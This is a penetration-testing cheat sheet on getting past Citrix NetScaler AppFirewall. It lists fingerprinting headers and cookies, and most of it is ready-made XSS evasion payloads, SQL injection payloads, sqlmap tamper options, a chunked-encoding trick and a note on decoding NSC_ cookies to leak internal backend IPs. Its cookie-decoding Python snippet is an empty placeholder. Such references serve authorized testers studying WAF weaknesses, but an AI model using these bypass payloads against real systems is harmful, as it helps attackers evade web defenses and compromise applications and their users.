# Citrix NetScaler AppFirewall

### Detection Signals
| Signal | Where |
|--------|-------|
| `nnCoection:` header (jumbled "Connection") | Response header — STRONG signal |
| `ns_af=` cookie | AppFirewall session cookie |
| `citrix_ns_id` cookie | NetScaler ID cookie |
| `NSC_` prefix in cookies | Load balancer cookies |
| `NS-CACHE` header | Caching layer header |
| `Citrix-TransactionId` header | Response header |

### Bypass Strategy
- **Recommended tool**: Burp Suite for manipulation, curl for probing.
- **Key weakness**: NetScaler cookie decode leaks internal backend info (similar to F5).
- **AppFirewall profiles**: Different profiles for different URL paths — test multiple endpoints.
- **Chunked encoding**: Works well against older NetScaler firmware.

### XSS Bypass
```
# NetScaler AppFirewall: blocks standard XSS, checks URL + body + cookies
# Bypasses:
<img src=x onerror="window['al'+'ert'](1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><table><mglyph><svg><mtext><textarea><path id=x>

# URL fragment (AppFirewall may not inspect fragments):
https://TARGET/page#<img/src=x onerror=alert(1)>
```

### SQLi Bypass
```
sqlmap --tamper=space2comment,between,charencode,equaltolike -u URL

# Manual:
' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--
' %55NION %53ELECT 1,2,3--
' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--

# Chunked transfer (effective on older firmware):
Transfer-Encoding: chunked
```

### Rate Limiting
- Configurable per-profile. Default depends on AppFirewall policy.
- Can be very aggressive with rate-based detection enabled.
- NSC_ cookies reveal backend pool membership.
- Recovery: variable.

### Internal IP Leak
```bash
# NSC_ cookie decode — similar to F5 BIGipServer:
# NSC_XXXX cookies contain encoded backend server IP
python3 -c "
cookie = 'NSC_mc_443=xxxxxxxxxxxxxxxx'
# Decode method varies by NetScaler version
# Check: https://support.citrix.com/article/CTX207738
"
```

---

